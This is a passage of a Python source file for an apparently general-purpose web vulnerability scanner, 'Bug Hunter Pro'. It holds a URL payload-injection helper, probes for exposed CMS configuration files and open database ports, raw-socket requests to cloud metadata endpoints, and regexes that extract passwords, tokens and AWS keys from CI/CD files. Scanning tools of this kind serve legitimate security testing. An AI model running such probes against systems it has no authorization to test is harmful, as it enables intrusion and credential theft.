                        "confidence": "high"
                    })
        except:
            pass
        
        return findings
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL"""
        parsed = urlparse(url)
        query = parsed.query
        
        if query:
            # Replace parameter value
            new_params = []
            params = query.split('&')
            for param in params:
                if '=' in param:
                    key, value = param.split('=', 1)
                    if unquote(key) == param_name:
                        new_params.append(f"{key}={quote(payload)}")
                    else:
                        new_params.append(param)
                else:
                    new_params.append(param)
            
            new_query = '&'.join(new_params)
            return url.replace(query, new_query)
        else:
            # Add parameter
            return f"{url}?{quote(param_name)}={quote(payload)}"

# ============================================================================
# ADVANCED MODULES (CMS, CLOUD, ETC.)
# ============================================================================

class AdvancedScanner:
    """Advanced scanning modules"""
    
    def __init__(self, client: HTTPClient, config: ScanConfig):
        self.client = client
        self.config = config
    
    async def scan_all(self) -> List[Dict[str, Any]]:
        """Run all advanced scans"""
        findings = []
        
        if "cms" in self.config.scan_types:
            print("\n[4/6] 🏗️  CMS SCANNING")
            print("-" * 50)
            cms_findings = await self.scan_cms()
            if cms_findings:
                findings.extend(cms_findings)
        
        if "cloud" in self.config.scan_types:
            print("\n[4/6] ☁️  CLOUD SCANNING")
            print("-" * 50)
            cloud_findings = await self.scan_cloud()
            if cloud_findings:
                findings.extend(cloud_findings)
        
        if "cicd" in self.config.scan_types:
            print("\n[4/6] 🔧 CI/CD SCANNING")
            print("-" * 50)
            cicd_findings = await self.scan_cicd()
            if cicd_findings:
                findings.extend(cicd_findings)
        
        return findings
    
    async def scan_cms(self) -> List[Dict[str, Any]]:
        """Scan for CMS vulnerabilities"""
        findings = []
        
        # WordPress
        wp_findings = await self.scan_wordpress()
        if wp_findings:
            findings.extend(wp_findings)
        
        # Joomla
        joomla_findings = await self.scan_joomla()
        if joomla_findings:
            findings.extend(joomla_findings)
        
        # Drupal
        drupal_findings = await self.scan_drupal()
        if drupal_findings:
            findings.extend(drupal_findings)
        
        return findings
    
    async def scan_wordpress(self) -> List[Dict[str, Any]]:
        """Scan WordPress sites"""
        findings = []
        
        wp_paths = [
            "/wp-admin/", "/wp-login.php", "/xmlrpc.php",
            "/wp-config.php", "/readme.html", "/license.txt"
        ]
        
        for path in wp_paths:
            url = f"{self.config.target.rstrip('/')}{path}"
            
            try:
                response = await self.client.head(url)
                if response and response.status == 200:
                    if path == "/wp-config.php":
                        findings.append({
                            "title": "WordPress Configuration File Exposed",
                            "description": "wp-config.php is publicly accessible",
                            "severity": "critical",
                            "url": url,
                            "evidence": "wp-config.php file accessible",
                            "confidence": "high"
                        })
                    elif path == "/xmlrpc.php":
                        findings.append({
                            "title": "WordPress XML-RPC Enabled",
                            "description": "XML-RPC interface is enabled",
                            "severity": "medium",
                            "url": url,
                            "evidence": "xmlrpc.php file accessible",
                            "confidence": "high"
                        })
            except:
                continue
        
        return findings
    
    async def scan_joomla(self) -> List[Dict[str, Any]]:
        """Scan Joomla sites"""
        findings = []
        
        joomla_paths = [
            "/administrator/", "/configuration.php",
            "/README.txt", "/htaccess.txt"
        ]
        
        for path in joomla_paths:
            url = f"{self.config.target.rstrip('/')}{path}"
            
            try:
                response = await self.client.head(url)
                if response and response.status == 200:
                    if path == "/configuration.php":
                        findings.append({
                            "title": "Joomla Configuration File Exposed",
                            "description": "configuration.php is publicly accessible",
                            "severity": "critical",
                            "url": url,
                            "evidence": "configuration.php file accessible",
                            "confidence": "high"
                        })
            except:
                continue
        
        return findings
    
    async def scan_drupal(self) -> List[Dict[str, Any]]:
        """Scan Drupal sites"""
        findings = []
        
        drupal_paths = [
            "/sites/default/settings.php",
            "/CHANGELOG.txt", "/README.txt"
        ]
        
        for path in drupal_paths:
            url = f"{self.config.target.rstrip('/')}{path}"
            
            try:
                response = await self.client.head(url)
                if response and response.status == 200:
                    if path == "/sites/default/settings.php":
                        findings.append({
                            "title": "Drupal Settings File Exposed",
                            "description": "settings.php is publicly accessible",
                            "severity": "critical",
                            "url": url,
                            "evidence": "settings.php file accessible",
                            "confidence": "high"
                        })
            except:
                continue
        
        return findings
    
    async def scan_cloud(self) -> List[Dict[str, Any]]:
        """Scan cloud infrastructure"""
        findings = []
        
        domain = urlparse(self.config.target).netloc
        
        # Check for exposed cloud metadata
        metadata_endpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
        ]
        
        for endpoint in metadata_endpoints:
            try:
                # Use raw socket to bypass potential restrictions
                parsed = urlparse(endpoint)
                host = parsed.netloc
                path = parsed.path
                
                reader, writer = await asyncio.open_connection(host, 80)
                request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                
                # Read response
                data = await asyncio.wait_for(reader.read(1024), timeout=5)
                writer.close()
                
                if b"200 OK" in data or b"instance" in data:
                    findings.append({
                        "title": "Cloud Metadata Endpoint Accessible",
                        "description": "Cloud metadata endpoint is accessible",
                        "severity": "critical",
                        "url": endpoint,
                        "evidence": "Cloud metadata endpoint responded",
                        "confidence": "high"
                    })
                    break
                    
            except:
                continue
        
        # Check for exposed databases
        db_ports = [
            (3306, "MySQL"), (5432, "PostgreSQL"),
            (27017, "MongoDB"), (1433, "MSSQL"),
            (6379, "Redis"), (5984, "CouchDB")
        ]
        
        for port, db_type in db_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((domain, port))
                sock.close()
                
                if result == 0:
                    findings.append({
                        "title": f"Exposed Database: {db_type}",
                        "description": f"{db_type} database is publicly accessible",
                        "severity": "critical",
                        "url": f"{domain}:{port}",
                        "evidence": f"Port {port} is open",
                        "confidence": "high"
                    })
            except:
                pass
        
        return findings
    
    async def scan_cicd(self) -> List[Dict[str, Any]]:
        """Scan CI/CD configurations"""
        findings = []
        
        cicd_files = [
            "/.gitlab-ci.yml", "/.travis.yml",
            "/Jenkinsfile", "/azure-pipelines.yml",
            "/.github/workflows/", "/.circleci/config.yml"
        ]
        
        for cicd_file in cicd_files:
            url = f"{self.config.target.rstrip('/')}{cicd_file}"
            
            try:
                response = await self.client.get(url)
                if response and response.status == 200:
                    content = await response.text()
                    
                    findings.append({
                        "title": "CI/CD Configuration File Exposed",
                        "description": f"CI/CD configuration file found: {cicd_file}",
                        "severity": "medium",
                        "url": url,
                        "evidence": f"{cicd_file} is publicly accessible",
                        "confidence": "high"
                    })
                    
                    # Check for hardcoded secrets
                    secret_patterns = [
                        (r'password\s*[:=]\s*["\']?([^"\'\s]+)["\']?', "password"),
                        (r'secret\s*[:=]\s*["\']?([^"\'\s]+)["\']?', "secret"),
                        (r'token\s*[:=]\s*["\']?([^"\'\s]+)["\']?', "token"),
                        (r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?', "API key"),
                        (r'AWSAccessKeyId\s*[:=]\s*["\']?([^"\'\s]+)["\']?', "AWS key")
                    ]
                    
                    for pattern, secret_type in secret_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            if isinstance(match, tuple):
                                match = match[0]
                            
                            if len(match) > 4:
                                findings.append({
                                    "title": "Hardcoded Secret in CI/CD Config",
                                    "description": f"{secret_type} found in {cicd_file}",
                                    "severity": "critical",
                                    "url": url,
                                    "evidence": f"Secret pattern found: {match[:20]}...",
                                    "confidence": "medium"
                                })
            except:
                continue
        
        return findings

# ============================================================================
# DASHBOARD
# ============================================================================

class Dashboard:
    """Real-time dashboard"""
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.scans = []
        self.findings = []
        self.stats = {}
    
    async def start(self):
        """Start dashboard server"""
        import http.server
        import socketserver
        import threading
        
        print(f"\n[+] Dashboard available at: http://localhost:{self.port}")
        print("[+] Press Ctrl+C to stop\n")
        
        handler = http.server.SimpleHTTPRequestHandler
        
        def run_server():
            with socketserver.TCPServer(("", self.port), handler) as httpd:
                httpd.serve_forever()
        
        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()
    
    def update(self, findings: List[Dict[str, Any]], stats: Dict[str, Any]):
        """Update dashboard data"""
        self.findings = findings
        self.stats = stats
        
        # Print real-time summary
        print("\n" + "="*60)
        print("REAL-TIME SCAN SUMMARY")
        print("="*60)
        
        severity_counts = defaultdict(int)
        for finding in findings:
            severity = finding.get("severity", "info")
            severity_counts[severity] += 1
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            count = severity_counts.get(severity, 0)
            if count > 0:
                print(f"  {severity.upper()}: {count}")
        
        # Show top critical findings
        critical_findings = [f for f in findings if f.get("severity") == "critical"]
        if critical_findings:
            print(f"\n  Top Critical Findings:")
            for finding in critical_findings[:3]:
                print(f"    • {finding.get('title')}")

# ============================================================================
# REPORT GENERATOR
# ============================================================================

class ReportGenerator:
    """Generate comprehensive reports"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.report_dir = "bug_hunter_reports"
        os.makedirs(self.report_dir, exist_ok=True)
    
    async def generate(self, findings: List[Dict[str, Any]], assets: Dict[str, Any], 
                      scan_stats: Dict[str, Any]) -> Dict[str, str]:
        """Generate all report formats"""
        print("\n[5/6] 📊 REPORT GENERATION")
        print("-" * 50)
        
        reports = {}
        
        if "html" in self.config.output_formats:
            print("  [+] Generating HTML report...")
            html_path = self.generate_html(findings, assets, scan_stats)
            reports["html"] = html_path
        
        if "json" in self.config.output_formats:
            print("  [+] Generating JSON report...")
            json_path = self.generate_json(findings, assets, scan_stats)
            reports["json"] = json_path
        
        if "csv" in self.config.output_formats:
            print("  [+] Generating CSV report...")
            csv_path = self.generate_csv(findings)
            reports["csv"] = csv_path
        
        return reports
    
    def generate_html(self, findings: List[Dict[str, Any]], assets: Dict[str, Any], 
                     scan_stats: Dict[str, Any]) -> str:
        """Generate HTML report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.report_dir}/report_{timestamp}.html"
        
        # Group findings by severity
        by_severity = defaultdict(list)
        for finding in findings:
            severity = finding.get("severity", "info")
            by_severity[severity].append(finding)
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Hunter Pro - Security Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background: #2c3e50; color: white; padding: 30px; border-radius: 10px; }}
        .summary {{ background: white; padding: 20px; margin: 20px 0; border-radius: 10px; }}
        .finding {{ background: white; margin: 15px 0; padding: 20px; border-radius: 10px; }}
        .critical {{ border-left: 5px solid #dc3545; }}
        .high {{ border-left: 5px solid #fd7e14; }}
        .medium {{ border-left: 5px solid #ffc107; }}
        .low {{ border-left: 5px solid #28a745; }}
        .info {{ border-left: 5px solid #17a2b8; }}
        .severity {{ font-weight: bold; padding: 5px 10px; border-radius: 3px; color: white; }}
        .critical-badge {{ background: #dc3545; }}
        .high-badge {{ background: #fd7e14; }}
        .medium-badge {{ background: #ffc107; color: black; }}
        .low-badge {{ background: #28a745; }}
        .info-badge {{ background: #17a2b8; }}
        pre {{ background: #f8f9fa; padding: 10px; border-radius: 5px; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐛 Bug Hunter Pro Security Report</h1>
            <p>Target: {self.config.target}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>Total Findings: {len(findings)}</p>
        </div>
        
        <div class="summary">
            <h2>Scan Summary</h2>
            <p>Total Findings: {len(findings)}</p>
            <p>Critical: {len(by_severity.get('critical', []))}</p>
            <p>High: {len(by_severity.get('high', []))}</p>
            <p>Medium: {len(by_severity.get('medium', []))}</p>
            <p>Low: {len(by_severity.get('low', []))}</p>
            <p>Info: {len(by_severity.get('info', []))}</p>
        </div>
        
        <h2>Detailed Findings</h2>
"""
        
        # Add findings
        for severity in ["critical", "high", "medium", "low", "info"]:
            if severity in by_severity:
                html_content += f'<h3>{severity.upper()} SEVERITY</h3>'
                
                for finding in by_severity[severity]:
                    # Escape HTML in user-provided content
                    title = html.escape(finding.get('title', 'N/A'))
                    description = html.escape(finding.get('description', 'N/A'))
                    url = html.escape(finding.get('url', 'N/A'))
                    evidence = html.escape(finding.get('evidence', 'N/A'))
                    confidence = html.escape(finding.get('confidence', 'N/A'))
                    parameter = html.escape(finding.get('parameter', ''))
                    payload = html.escape(str(finding.get('payload', '')))
                    
                    html_content += f"""
        <div class="finding {severity}">
            <h3>{title}</h3>
            <p><span class="severity {severity}-badge">{severity.upper()}</span></p>
            <p><strong>Description:</strong> {description}</p>
            <p><strong>URL:</strong> <a href="{url}" target="_blank">{url}</a></p>
            <p><strong>Evidence:</strong> {evidence}</p>
            <p><strong>Confidence:</strong> {confidence}</p>
"""
                    
                    if parameter:
                        html_content += f'<p><strong>Parameter:</strong> {parameter}</p>'
                    
                    if payload:
                        html_content += f'<p><strong>Payload:</strong> <code>{payload}</code></p>'
                    
                    html_content += """
        </div>
"""
        
        html_content += """
    </div>
</body>
</html>
"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"    [✓] HTML report saved: {filename}")
        return filename
    
    def generate_json(self, findings: List[Dict[str, Any]], assets: Dict[str, Any], 
                     scan_stats: Dict[str, Any]) -> str:
        """Generate JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.report_dir}/report_{timestamp}.json"
        
        report = {
            "metadata": {
                "target": self.config.target,
                "timestamp": datetime.now().isoformat(),
                "scan_mode": self.config.mode.value,
                "scan_duration": scan_stats.get("duration", "N/A")
            },
            "assets": assets,
            "findings": findings,
            "statistics": scan_stats
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"    [✓] JSON report saved: {filename}")
        return filename
    
    def generate_csv(self, findings: List[Dict[str, Any]]) -> str:
        """Generate CSV report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.report_dir}/report_{timestamp}.csv"
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Title", "Severity", "Description", "URL", "Evidence", "Parameter", "Payload", "Confidence"])
            
            for finding in findings:
                writer.writerow([
                    finding.get("title", ""),
                    finding.get("severity", ""),
                    finding.get("description", ""),
                    finding.get("url", ""),
                    finding.get("evidence", ""),
                    finding.get("parameter", ""),
                    finding.get("payload", ""),
                    finding.get("confidence", "")
                ])
        
        print(f"    [✓] CSV report saved: {filename}")
        return filename

# ============================================================================
# MAIN ENGINE
# ============================================================================

class BugHunterPro:
    """Main Bug Hunter Pro Engine"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = None
        self.recon = None
        self.crawler = None
        self.scanner = None
        self.advanced = None
        self.reporter = None
        self.dashboard = None
        self.assets = {}
        self.findings = []
        self.stats = {
            "start_time": None,
            "end_time": None,
            "requests": 0,
            "errors": 0,
            "findings": 0
        }
        
        print("""
╔══════════════════════════════════════════════════════════╗
║               BUG HUNTER PRO v4.1                        ║
║            Unified Enterprise Scanner                    ║
╚══════════════════════════════════════════════════════════╝
        """)
    
    async def run(self):
        """Run complete security assessment"""
        self.stats["start_time"] = datetime.now()
        
        try:
            # Initialize modules
            async with HTTPClient(self.config) as client:
                self.client = client
                
                self.recon = ReconnaissanceModule(client, self.config)
                self.crawler = SmartCrawler(client, self.config)
                self.scanner = VulnerabilityScanner(client, self.config)
                self.advanced = AdvancedScanner(client, self.config)
                self.reporter = ReportGenerator(self.config)
                
                # Start dashboard if enabled
                if self.config.enable_dashboard:
                    self.dashboard = Dashboard(self.config.dashboard_port)
                    await self.dashboard.start()
                
                # Run reconnaissance
                self.assets = await self.recon.run()
                
                # Run crawling
                endpoints = await self.crawler.crawl(self.config.target)
                
                # Run vulnerability scanning
                basic_findings = await self.scanner.scan_endpoints(endpoints)
                if basic_findings:
                    self.findings.extend(basic_findings)
                
                # Run advanced scanning
                advanced_findings = await self.advanced.scan_all()
                if advanced_findings:
                    self.findings.extend(advanced_findings)
                
                # Update stats
                self.stats["end_time"] = datetime.now()
                self.stats["findings"] = len(self.findings)
                self.stats["requests"] = self.client.request_count
                self.stats["errors"] = self.client.error_count
                self.stats["duration"] = str(self.stats["end_time"] - self.stats["start_time"])
                
                # Update dashboard
                if self.dashboard:
                    self.dashboard.update(self.findings, self.stats)
                
                # Generate reports
                print("\n[6/6] ✅ SCAN COMPLETE")
                print("-" * 50)
                reports = await self.reporter.generate(self.findings, self.assets, self.stats)
                
                # Print final summary
                self.print_summary(reports)
                
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")
        except Exception as e:
            print(f"\n[!] Scan failed: {e}")
            import traceback
            traceback.print_exc()
    
    def print_summary(self, reports: Dict[str, str]):
        """Print scan summary"""
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        print(f"Target: {self.config.target}")
        print(f"Duration: {self.stats['duration']}")
        print(f"Requests: {self.stats['requests']}")
        print(f"Errors: {self.stats['errors']}")
        print(f"Vulnerabilities Found: {self.stats['findings']}")
        
        # Count by severity
        severity_counts = defaultdict(int)
        for finding in self.findings:
            severity = finding.get("severity", "info")
            severity_counts[severity] += 1
        
        print("\nSeverity Breakdown:")
        for severity in ["critical", "high", "medium", "low", "info"]:
            count = severity_counts.get(severity, 0)
            if count > 0:
                print(f"  {severity.upper()}: {count}")
        
        # List critical findings
        critical_findings = [f for f in self.findings if f.get("severity") == "critical"]
        if critical_findings:
            print(f"\nCritical Findings ({len(critical_findings)}):")
            for finding in critical_findings[:5]:
                print(f"  • {finding['title']}")
        
        print(f"\nReports generated:")
        for format, path in reports.items():
            print(f"  • {format.upper()}: {path}")
        
        if self.config.enable_dashboard:
            print(f"\nDashboard: http://localhost:{self.config.dashboard_port}")

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

async def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Bug Hunter Pro v4.1 - Enterprise Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t https://example.com
  %(prog)s -t http://testphp.vulnweb.com -m deep -w 100
  %(prog)s -t https://example.com --dashboard --output html,json
  %(prog)s -t https://example.com --scan-types cms,cloud,cicd
  %(prog)s -t https://example.com --proxy http://proxy:8080

Scan Types: cms, ecommerce, framework, cloud, cicd, websocket, 
           graphql, cache, smuggling, business_logic, rate_limit, dns_rebinding
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("-m", "--mode", choices=["fast", "normal", "deep", "aggressive"], 
                       default="normal", help="Scan mode (default: normal)")
    parser.add_argument("-w", "--workers", type=int, default=50, 
                       help="Maximum concurrent workers (default: 50)")
    parser.add_argument("--timeout", type=int, default=30, 
                       help="Request timeout in seconds (default: 30)")
    parser.add_argument("--depth", type=int, default=3, 
                       help="Crawling depth (default: 3)")
    parser.add_argument("--wordlist", action="append", help="Custom wordlist files")
    parser.add_argument("--auth-token", help="Authentication token")
    parser.add_argument("--cookie", help="Cookie string (key=value; key2=value2)")
    parser.add_argument("--proxy", help="Proxy URL (http://proxy:8080)")
    parser.add_argument("--output", default="html,json", help="Output formats (default: html,json)")
    parser.add_argument("--scan-types", default="cms,cloud,cicd", help="Scan types to perform")
    parser.add_argument("--dashboard", action="store_true", help="Enable web dashboard")
    parser.add_argument("--dashboard-port", type=int, default=8080, help="Dashboard port (default: 8080)")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--rate-limit", type=int, default=10, help="Requests per second (default: 10)")
    
    args = parser.parse_args()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie_pair in args.cookie.split(';'):
            if '=' in cookie_pair:
                key, value = cookie_pair.strip().split('=', 1)
                cookies[key] = value
    
    # Parse headers
    headers = {}
    if args.auth_token:
        headers["Authorization"] = args.auth_token
    
    # Parse output formats
    output_formats = [fmt.strip() for fmt in args.output.split(",")]
    
    # Parse scan types
    scan_types = [st.strip() for st in args.scan_types.split(",")]
    
    # Create config
    config = ScanConfig(
        target=args.target,
        mode=ScanMode(args.mode),
        max_concurrent=args.workers,
        timeout=args.timeout,
        depth=args.depth,
        verify_ssl=not args.no_ssl_verify,
        custom_wordlists=args.wordlist or [],
        auth_token=args.auth_token,
        cookies=cookies,
        headers=headers,
        proxy=args.proxy,
        output_formats=output_formats,
        enable_dashboard=args.dashboard,
        dashboard_port=args.dashboard_port,
        rate_limit=args.rate_limit,
        scan_types=scan_types
    )
    
    # Check dependencies
    missing = []
    for package in ["aiohttp", "dnspython"]:
        try:
            if package == "aiohttp":
                import aiohttp
            elif package == "dnspython":
                import dns.resolver
        except ImportError:
            missing.append(package)
    
    if missing:
        print(f"[!] Missing required packages: {', '.join(missing)}")
        print(f"[!] Install with: pip install {' '.join(missing)}")
        sys.exit(1)
    
    # Run scanner
    scanner = BugHunterPro(config)
    await scanner.run()

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print("[!] Python 3.7 or higher is required")
        sys.exit(1)
    
    # Run main
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
